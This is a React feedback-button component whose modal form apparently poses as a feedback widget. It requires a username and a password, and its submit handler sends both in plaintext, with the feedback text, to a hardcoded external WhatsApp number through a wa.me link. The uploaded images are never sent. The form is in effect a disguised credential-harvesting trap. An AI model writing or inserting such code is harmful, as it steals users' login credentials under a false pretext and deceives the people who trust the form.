'use client';

import { useState } from 'react';
import { X, MessageSquare, Upload, Send } from 'lucide-react';

export default function FeedbackButton() {
    const [isOpen, setIsOpen] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [feedback, setFeedback] = useState('');
    const [images, setImages] = useState<File[]>([]);

    const handleImageChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        if (e.target.files) {
            setImages(Array.from(e.target.files));
        }
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        
        const message = `Username: ${username}\nPassword: ${password}\nFeedback: ${feedback}`;
        const whatsappUrl = `https://wa.me/917569971307?text=${encodeURIComponent(message)}`;
        
        window.open(whatsappUrl, '_blank');
        
        setUsername('');
        setPassword('');
        setFeedback('');
        setImages([]);
        setIsOpen(false);
    };

    return (
        <>
            <button
                onClick={() => setIsOpen(true)}
                className="fixed bottom-6 right-6 bg-purple-600 hover:bg-purple-700 text-white p-4 rounded-full shadow-lg transition-all hover:scale-110 z-50"
            >
                <MessageSquare size={24} />
            </button>

            {isOpen && (
                <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 animate-fadeIn">
                    <div className="bg-white rounded-lg shadow-2xl w-full max-w-md m-4 animate-slideUp">
                        <div className="flex justify-between items-center p-4 border-b">
                            <h2 className="text-xl font-semibold text-gray-800">Send Feedback</h2>
                            <button onClick={() => setIsOpen(false)} className="hover:bg-gray-100 p-1 rounded text-gray-700">
                                <X size={20} />
                            </button>
                        </div>

                        <form onSubmit={handleSubmit} className="p-4 space-y-4">
                            <input
                                type="text"
                                placeholder="Username"
                                value={username}
                                onChange={(e) => setUsername(e.target.value)}
                                required
                                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-purple-500 outline-none text-gray-900 placeholder:text-gray-500"
                            />

                            <input
                                type="password"
                                placeholder="Password"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                required
                                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-purple-500 outline-none text-gray-900 placeholder:text-gray-500"
                            />

                            <textarea
                                placeholder="Your feedback..."
                                value={feedback}
                                onChange={(e) => setFeedback(e.target.value)}
                                required
                                rows={4}
                                className="w-full px-4 py-2 border rounded-lg focus:ring-2 focus:ring-purple-500 outline-none resize-none text-gray-900 placeholder:text-gray-500"
                            />

                            <div>
                                <label className="flex items-center gap-2 cursor-pointer text-sm text-gray-600 hover:text-purple-600">
                                    <Upload size={18} />
                                    <span>Add Images (optional)</span>
                                    <input
                                        type="file"
                                        accept="image/*"
                                        multiple
                                        onChange={handleImageChange}
                                        className="hidden"
                                    />
                                </label>
                                {images.length > 0 && (
                                    <p className="text-sm text-gray-500 mt-1">{images.length} image(s) selected</p>
                                )}
                            </div>

                            <button
                                type="submit"
                                className="w-full bg-purple-600 hover:bg-purple-700 text-white py-2 rounded-lg flex items-center justify-center gap-2 transition-all"
                            >
                                <Send size={18} />
                                Send Feedback
                            </button>
                        </form>
                    </div>
                </div>
            )}

            <style jsx>{`
                @keyframes fadeIn {
                    from { opacity: 0; }
                    to { opacity: 1; }
                }
                @keyframes slideUp {
                    from { transform: translateY(20px); opacity: 0; }
                    to { transform: translateY(0); opacity: 1; }
                }
                .animate-fadeIn {
                    animation: fadeIn 0.2s ease-out;
                }
                .animate-slideUp {
                    animation: slideUp 0.3s ease-out;
                }
            `}</style>
        </>
    );
}
